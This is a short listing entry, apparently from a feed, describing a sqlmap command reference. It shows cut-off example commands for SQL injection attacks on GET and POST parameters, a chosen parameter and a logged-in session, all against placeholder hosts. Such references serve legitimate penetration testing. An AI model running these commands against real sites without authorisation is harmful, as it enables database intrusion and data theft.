item.title: SQLMap Command Reference
item.description: References for SQLMap - SQLMap # attacking parameters in GET request sqlmap -u "http://vuln.com/id=1&str=a" # attacking parameters in POST request sqlmap -u "http://vulnpost.com/" --data="user_name=user&password=password&Submit_button=Submit" # attacking against a specific parame sqlmap -u "http://vulnpost.com/" --data="user_name=user&password=password&Submit_button=Submit" -p "id" # attacking with default options sqlmap -u "http://vuln.com/id=1&str=a" --batch # attacking on a session; after loggin in sqlmap...
